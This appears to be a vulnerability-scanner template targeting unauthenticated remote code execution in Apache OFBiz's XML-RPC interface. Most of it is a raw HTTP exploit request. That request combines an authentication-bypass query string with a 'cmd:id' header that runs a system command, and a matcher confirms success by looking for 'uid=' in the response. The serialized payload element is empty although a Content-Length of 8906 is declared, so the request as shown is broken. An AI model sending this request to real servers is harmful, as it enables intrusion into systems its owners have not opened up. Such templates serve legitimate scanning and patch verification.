id: Apache-Ofbiz-XML-RPC-RCE
info:
  author: "\u829D\u58EB\u571F\u62E8\u9F20"
  description: "Apache OFBiz\u4E2D\u6B64\u8FC7\u65F6\u7EC4\u4EF6\u7684\u5B58\u5728\
    \u5F15\u5165\u4E86\u4E00\u4E2A\u4E25\u91CD\u6F0F\u6D1E\u3002\u5229\u7528\u8BE5\
    \u6F0F\u6D1E\u653B\u51FB\u8005\u53EF\u4EE5\u5728\u53D7\u5F71\u54CD\u7684Apache\
    \ OFBiz\u670D\u52A1\u5668\u4E0A\u6267\u884C\u4EFB\u610F\u4EE3\u7801\uFF0C\u800C\
    \u65E0\u9700\u4E8B\u5148\u8FDB\u884C\u4EFB\u4F55\u8EAB\u4EFD\u9A8C\u8BC1\u3002"
  name: Apache-Ofbiz-XML-RPC-RCE
  severity: high
requests:
- matchers:
  - part: body
    type: word
    words:
    - uid=
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y\
    \ HTTP/1.1\nHost: {{Hostname}}\nSec-Ch-Ua: \"Not=A?Brand\";v=\"99\", \"Chromium\"\
    ;v=\"118\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests:\
    \ 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\
    \ (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n\
    Sec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest:\
    \ document\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\n\
    Connection: close\ncmd:id\nContent-Length: 8906\n\n<?xml version=\"1.0\"?>\n<methodCall>\n\
    \  <methodName>RCE</methodName>\n  <params>\n    <param>\n      <value>\n    \
    \    <struct>\n          <member>\n            <name>RCE</name>\n            <value>\n\
    \              <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\"\
    >   \n\
    \              </serializable>\n            </value>\n          </member>\n  \
    \      </struct>\n      </value>\n    </param>\n  </params>\n</methodCall>"
